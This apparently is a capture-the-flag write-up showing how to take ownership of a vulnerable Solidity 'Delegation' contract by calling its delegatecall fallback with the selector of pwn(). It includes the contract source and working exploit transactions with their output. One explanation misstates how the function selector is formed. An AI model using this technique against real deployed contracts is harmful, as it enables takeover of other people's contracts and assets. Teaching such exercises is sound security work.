
### Exercise 6: DelegateCall

Ownership of the vulnerable contract can be taken by a hacker by exploiting the contract's use of `delegate_call` and its fallback function.
NB: ownership of the `Delegate` contract can be taken extremely easily, simply by calling the contract's `pwn()` function directly, passing a new address as the new owner, i.e.

```bash
hacker = accounts.load('main')

contract = Delegate.at('0xB2f870a4e846513304B8D9DACCf2ec6Bad06a4Ed')
contract.pwn({'from':hacker})

```

However, that's not the point of this exercise - we want to take ownership of `Delegation` not `Delegate`. For this, the route to taking ownership is via the `delegate_call` vulnerabilty. The key components of this vulnerability are:

1. `Delegation.sol` makes a `delegate_call()` to `Delegate.sol` inside its fallback function.
2. `Delegate.sol` has a function `pwn()` that changes the contract ownership to `msg.sender()`
3. So to take ownership of `Delegation.sol`, we need to trigger its fallback function with params that cause `pwn()` to execute.

This works because `delegate_call` executes code from another contract <b>in the caller's context<b> meaning it updates the caller's storage. Therefore, updating the value of `owner` in `Delegate.sol` updates the value of `owner` in `Delegation.sol`, since the code in `Delegate.sol` is run in `Delegation.sol`'s context. Therefore, if we can get `Delegation.sol` to execute `pwn()` we take ownership of `Delegation.sol`.

To do this, we need to trigger the fallback function and also pass appropriate arguments that cause `pwn()` to be executed. Triggering the fallback function is achieved simply by sendng a transaction to the contract using `web3.sendTransaction()`. This triggers the fallback function because it does not invoke any of the explicitly defined functions in the contract. To trigger `pwn()` we provide the method ID for `pwn()` in `msg.data`. The format is the function name as hex-encoded bytes, so that `pwn()` = `0xdd365b8b`, padded to 32 bytes. We can then pass this hex-encoded instruction to execute `pwn()` to the fallback function and thereby take ownership of `Delegation.sol`.

### Vulnerable Contract

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

```


### Execution

NB. This *should* work via brownie console, but web3.py's send_transaction function repeatedly hung for me and the transaction never completed.

```bash
hacker = accounts.load('main')
delegation = Delegation.at("0xB2f870a4e846513304B8D9DACCf2ec6Bad06a4Ed")
web3.eth.sendTransaction({'from':hacker.address, 'to':delegation.address, 'data':"0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"})

```

Instead, the following works, using web3js in the browser console (browser>inspect>console):

```javascript

>>> await web3.utils.keccak256("pwn()")
  >>> '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
>>> await contract.sendTransaction({'to': contract.address, 'from':'0xa0F57bd9E5F156BD60Ff214abA29c4cAF6d2C386', 'data':'0xdd365b8b'})
>>> contract.owner()
  >>> '0xa0F57bd9E5F156BD60Ff214abA29c4cAF6d2C386'


```
